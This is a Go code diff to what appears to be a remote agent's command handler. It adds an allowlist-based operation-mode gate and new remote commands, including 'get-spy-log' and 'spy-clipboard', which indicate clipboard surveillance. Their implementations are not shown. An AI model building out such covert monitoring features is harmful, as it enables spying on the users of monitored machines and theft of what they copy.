@@ -109,6 +109,16 @@ func ExecuteChecked(cmdID, cmd, args string) (result string, suppressed bool, er
 		}
 		seenCmdsMu.Unlock()
 	}
+	// Operation-mode gate (v1.42.3): restricted modes only run their
+	// allowlist. Always-on verbs bypass so an agent can never lock out
+	// set-mode (its only way back) or break ping/version health checks.
+	switch strings.ToLower(strings.TrimSpace(cmd)) {
+	case "ping", "version", "get-version", "get-mode", "set-mode":
+	default:
+		if m := AgentMode(); !modeAllows(m, cmd) {
+			return "", false, fmt.Errorf("%s", ModeDenied(m))
+		}
+	}
 	result, err = Execute(cmd, args)
 	return result, false, err
 }
@@ -153,6 +163,14 @@ func Execute(cmd, args string) (string, error) {
 		return version.Agent(), nil
 	case "set-agent-token":
 		return SetAgentToken(args)
+	case "get-mode":
+		return AgentMode(), nil
+	case "set-mode":
+		return SetAgentMode(args)
+	case "get-spy-log":
+		return getSpyLog(args)
+	case "spy-clipboard":
+		return SetSpyClipboard(args)
 	case "get-hostname":
 		hn, _ := os.Hostname()
 		return hn, nil
